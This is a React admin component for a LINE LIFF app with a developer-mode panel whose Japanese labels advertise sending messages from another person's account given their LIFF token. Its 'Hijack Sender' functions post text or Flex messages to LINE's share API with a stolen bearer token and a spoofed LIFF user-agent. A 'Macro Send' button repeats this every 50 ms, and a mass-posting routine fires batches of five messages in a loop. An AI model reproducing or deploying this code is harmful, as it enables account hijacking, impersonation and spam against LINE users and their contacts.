import React, { useState } from 'react'

export default function Admin(props) {

    const liff = props.liff;

    let [data, setData] = useState({
        hyjackToken: (() => {
            let query = new URLSearchParams(window.location.search);
            let inittoken = query.get("init-token");
            return inittoken;
        })(), // ?token=?
        hyjackMsg: "",
        hyjackFlex: "",
        superRangeNum: "1",
        superRangeMsg: "hi! ameame"
    })

    function hyjackSender() {
        const token = data.hyjackToken;
        const msg = {
            type: "text",
            text: data.hyjackMsg
        }
        const auth = "Bearer " + token;

        const headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Authorization': auth,
            'User-Agent': 'Mozilla/0 (Android; CPU IOS 810 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E248 Safari Line/13.11.0 LIFF',
        }

        fetch('https://api.line.me/message/v3/share', {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                messages: [msg]
            }),
            compressed: true
        })
    }

    function hyjackFlexer() {
        const token = data.hyjackToken;
        const msg = data.hyjackFlex
        const auth = "Bearer " + token;

        const headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Authorization': auth,
            'User-Agent': 'Mozilla/0 (Android; CPU IOS 810 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E248 Safari Line/13.11.0 LIFF',
        }

        fetch('https://api.line.me/message/v3/share', {
            method: 'POST',
            headers: headers,
            body: JSON.stringify({
                messages: JSON.parse(msg)
            }),
            compressed: true
        })
    }

    function superSender() {
        const num = parseInt(data.superRangeNum);
        const auth = "Bearer " + liff.getAccessToken();

        const headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Authorization': auth,
            'User-Agent': 'Mozilla/0 (Android; CPU IOS 810 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E248 Safari Line/13.11.0 LIFF',
        }

        const msg = {
            type: "text",
            text: data.superRangeMsg
        }

        const loop = Math.ceil(num / 5);

        for (let i = 0; i < loop; i++) {
            fetch('https://api.line.me/message/v3/share', {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({
                    messages: [msg, msg, msg, msg, msg]
                }),
                compressed: true
            })
        }

    }


    return (
        <div>
            <details>
                <summary>開発者モード・Beta機能</summary>
                <t>開発中のツール群や使用の難しいツール</t>
                <t>動作は保証しません。</t> <br />

                <st>Hijack Sender</st>
                <t>Liffのtoken (ey...)が有れば相手のアカウントでメッセージを送信可能</t>
                <t>
                    <input
                        type="text"
                        value={data.hyjackToken}
                        placeholder='token (ey..)'
                        onChange={(e) => {
                            setData({ ...data, hyjackToken: e.target.value });
                        }}
                    />
                </t>
                <t>
                    <input
                        type="text"
                        value={data.hyjackMsg}
                        placeholder='message'
                        onChange={(e) => {
                            setData({ ...data, hyjackMsg: e.target.value });
                        }}
                    />
                </t>
                <t><button onClick={() => { hyjackSender(); }}>Send</button></t>
                <t><button onClick={() => {
                    setInterval(() => {
                        hyjackSender();
                    }, 50)
                }}>Macro Send</button></t>

                <t>
                    <input
                        type="text"
                        value={data.hyjackFlex}
                        placeholder='[{type:"...", altText: "...", ...},...]'
                        onChange={(e) => {
                            setData({ ...data, hyjackFlex: e.target.value });
                        }}
                    />
                </t>

                <t><button onClick={() => { hyjackFlexer() }}>Send</button></t>

                <br />
                <t>URLクエリ</t>
                <t>Query: {window.location.search}</t>

                <br />
                <t>超連投</t>
                <t>
                    <input
                        type="text"
                        value={data.superRangeMsg}
                        placeholder="hi! ameame"
                        onChange={(e) => {
                            setData({ ...data, superRangeMsg: e.target.value });
                        }}
                    />
                </t>
                <t>
                    <input
                        type="text"
                        value={data.superRangeNum}
                        placeholder="~20"
                        onChange={(e) => {
                            setData({ ...data, superRangeNum: e.target.value });
                        }}
                    />
                </t>
                <t>
                    <button onClick={superSender}>Send</button>
                </t>
            </details>
        </div>
    )
}

// liff token永続化